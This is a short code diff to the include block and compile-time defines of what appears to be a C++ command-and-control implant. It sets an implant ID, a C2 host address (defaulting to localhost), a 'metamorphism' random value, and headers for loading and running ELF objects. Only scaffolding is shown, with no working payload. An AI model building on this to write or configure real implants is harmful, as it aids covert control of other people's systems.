@@ -1,19 +1,39 @@
 
 #include <iostream>
 #include <string.h>
-#include <stdio.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/utsname.h> // uname()
-
-#include <sys/syscall.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <stdio.h>
 #include <dlfcn.h>
 
+// For JSON parsing.
 #include <map>
-#include <algorithm>
-#include <sstream>
 #include <vector>
-#include <sys/wait.h> // wait() for fork()
+#include <sstream>
+
+// Get computer information
+#include <sys/utsname.h>
+
+// For parsing the ELF files.
+#include "LittleELF.h"
+#include <sys/mman.h>
+
+// For executing objects
+#include <sys/wait.h>
+#include <threads.h>
+
+// For JobHunter
+#include <vector>
+#include <pthread.h>
+
+// Check if the compiler gives us an implant ID else use the fake one.
+#ifndef SLAVE_ID
+    #define SLAVE_ID "TEST_SLAVE_ID"
+#endif
+
+// Check if compiler gives us a C2 host address else use the debug one.
+#ifndef C2HOST
+    #define C2HOST "127.0.0.1:8080"
+#endif
+
+// Check if compiler gives us an random value for metamorphism.
+#ifndef RANDOMINT
+    #define RANDOMINT 0x12345678
+#endif
